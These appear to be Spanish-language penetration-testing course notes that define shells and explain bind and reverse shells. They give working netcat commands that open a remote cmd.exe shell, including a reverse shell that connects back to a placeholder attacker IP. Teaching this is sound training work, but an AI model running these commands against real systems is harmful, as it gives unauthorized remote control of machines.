# CPTA 3

## Shell

Shell es una capa de software que: 

- Envuelve el nucleo (kernel) del sistema operativo
- Permite al usuario interactuar con el sistema
- Interpreta y ejecuta comandos

### Bind Shell

Tecnica de hacking en la que el atacante establece conexión al sistema objetivo, que tiene un servicio/shell en escucha

Generalmente requiere que el puerto de escucha esté abierto y accesible desde el exterior

Desde Windows: 

```sh
.\nc.exe -l -p 4444 -e cmd.exe
```

Desde Kali:

```sh
nc 192.168.40.XX 4444
```

### Reverse Shell

Tecnica de hacking en la que el atacante crea una conexión desde su maquina comprometida hacia su maquina atacante, permitiendole tomar el control remoto de la maquina objetivo

Aquí la victima es la que establece la conexión hacia el atacante, lo que a menudo permite evadir firewalls y sistemas de detección de intrusiones

Desde Windows: 

```sh
.\nc.exe 192.168.40.XX 4444 -e cmd.exe
```

Desde Kali:

```sh
nc -lvp 4444
```